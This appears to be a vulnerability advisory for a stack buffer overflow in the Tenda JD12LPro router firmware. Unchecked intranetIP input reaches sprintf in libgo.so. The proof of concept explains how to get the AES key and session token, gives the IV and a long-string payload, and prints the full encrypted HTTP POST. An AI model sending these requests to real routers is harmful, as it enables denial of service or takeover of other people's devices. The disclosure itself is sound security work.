# JD12LPro Vulnerability
Vendor:Tenda

Product:JD12LPro

Version: V16.03.53.10

Vulnerability: buffer overflow

Firmware Download:https://www.tenda.com.cn/material/show/619863173935173
# Descriptions
We found an overflow vulnerability in `libgo.so` :
In formPortListSet function,it reads in a user-provided parameter `intranetIP`,
<img width="780" height="164" alt="image" src="https://github.com/user-attachments/assets/a14fd2a3-f05f-42a1-8ff2-6ce54467fcc2" />

The intranetIP value, obtained via the websGetJsonVar function, is passed to the JsonVarparameter. This JsonVarparameter is then unsafely concatenated into the sbuffer using the sprintf function. The root cause is the complete absence of any length validation or restriction on the JsonVarinput throughout this process.​ This flaw allows an attacker to supply an arbitrarily long string for the networkfield, which sprintfwill write into the fixed-size buffer s, resulting in a stack-based buffer overflow.
<img width="2004" height="1040" alt="image" src="https://github.com/user-attachments/assets/66daaa64-2f73-4abc-a30d-d05b54505d54" />
As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution.
# Proof of Concept (PoC)
httpd dynamically links against libgo.so.

The data packets are encrypted using AES in CBC mode. The encryption key and stok are extracted from the 'sign' and 'stok' fields in the login response packet, respectively.

IV：EU5H62G9ICGRNI43

<img width="2188" height="662" alt="image" src="https://github.com/user-attachments/assets/152253f6-fc13-43c7-87b5-861ce482e82d" />
Unencrypted data：

payload = 'a'*1200

{"intranetIP":"{payload}","intranetPort":"80","extranetPort":"8080","protocol":"tcp"}}
```
POST /;stok=a74261ba42fdea698945280e143761d2/goform/setModules?modules=portList HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/json; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 1719
Origin: http://192.168.1.1
Connection: keep-alive
Referer: http://192.168.1.1/index.html?0.1112679145817030
Cookie: bLanguage=cn; _:USERNAME:_=f5f69b4501b05e6e9953bc1a3155b8d1

{"data":"7NBt8AfSk7sRpF5mqSW2lzquHuYlHqyugfieU25wIu6umESnbU1KQLW9M90A84rL7Zmo1u4oAFGTCIKbmkwiKJILZt+zWAOpOWmh2poQ8vbgEU+uTQnLdxGilUjfIJy/bM1oZOpeV5pm/ael8ZlFN4uOMCnPEhVlmVNnLb0q9CbPXs6emL73KHwLCzoxPRL/nYfUYvyFgcuUJVkCXDm/3VJkNle4anrG/wxGw2rJiZlrkJAa0zYPwCfjEjTkr+h+X8hGAGASVLT8LbWI/BQ8KjRr820QLvtStli41Nw6dPTjfiYGGUdh4hkhIDkg5WjQ8aEy3jzz49SYxZqZmSadZ5WbvXgF3Z9xRYM3w6JDxigPnQ7CutQG2t6UAeaxQRxVNUJk456LZzA/ubsCEBZ05OeGd/m2v3AbFxrZzQ55Yu004PJLBM9uERopxjFCjCmya9Rdlu+AR4fBHNZW5Z1EnnStP92jZwt679RUfEFvUawPgGcSxYcNITs1ZfbdHhklGwetGLcgd12jT6vz2oMZZuQ6/km1YeR1mavbmCWEPXCGwRiGvruVExQpV8wMV2JcP8dadEo0zwXgg8qFGj6Iv8LzUGJtFGJZ4240CTBnmFM44FJriG+xp1klz/G7BaMnHzPoP+LnLoPfwniShTE6FhmlQmU3VGMflS2T7Y88p//ZUVRnR0N1c1g0uEc8sIpaMACwCzpAWHt31SEgIsrmp2WjOTEDTRrhtywwfXbdz0FhiWOBAwlQMo7L7qSXdr07y1G5I9qD77I6xZj7MQTaHzz9xdCrGI8G5RV8/44sq9qdFyYN+XdJsVeRH+swCr9zASLbaHZvg/fNpP71UlKgM9Wewfq6u+ETP/nmcSK9rDoc7mF5dhvPjagWv36MzCsvI92Qt7hCqwutCRJGBFJFWrjUoB1TZHrHhi5jJ6KrIyF+DvHsh8gz14Io8Im4i/ZdmT0479WExkY8U95U90iPvvpBpGfAcGqB0dRqdvZGf0ejFhVtR+2uoeb+3RmFgtRFNEsjgLdz/dNgVwUgolDYxDFBTZoERFi1y+vlnKqxo47wf+s8VFP64n2O5TcH4rbIUF2G4tb+aAzGbtDjyXoIR/bLnT+gS58qQ/oH4cBmtiR5B+BLhBwvONZvTFKXAiJxGhfLGP2T1T/eAHAm0zq+nAyMsB1UnD7zJ5m0n/gAuHHLw4WMIaxmGoADXOcyPIOpUKZ4bl9RLzlHOeh8pXHnOxmzpqohtpng1x8FKgaRExKqFpfFHUXUFapZSnE+lZkqdY0oebjYQoTl4X90s5nqiX65hJfk8cG4EBlcHkaILgzeTP/x2FboPxIm01O8Cm508TrYqCgYOoCedZhnyqxdKxnJ6tdGPYNDUzccJGRKkb5m3/QtWQcg4m/AgJnlJPi8iXkiBT0bRFIuf4V0+qkJ+/0VaGmsUB8QV9fFkIM6dRchgYxCgNzcmTfxiqwXawhXYu7PN6wDU9vMtpJkIQc9mIlI+t8Ifa9BBwQ6AX3Zt2bHoHEStsMhVBYei55a8YvQzL75A/4Gq8OuMQgDuEiXzy05yl2d5If28IxSQFLJF7LMYuYCoKdeVNzbzQryP4VBFiPIqYES7l82ztp9RALwsj/tQ/Vt2QBbztn2h27v0IP5GJ3kxSlYAwTVmqHw93qm3hpmZq26TlOzLB0MsWE6C6FzS0Q+dpnak3V/JyleuOA="}
```
# overcome
<img width="2770" height="1248" alt="image" src="https://github.com/user-attachments/assets/121b7f81-6c29-48d3-9542-d81f17d06062" />
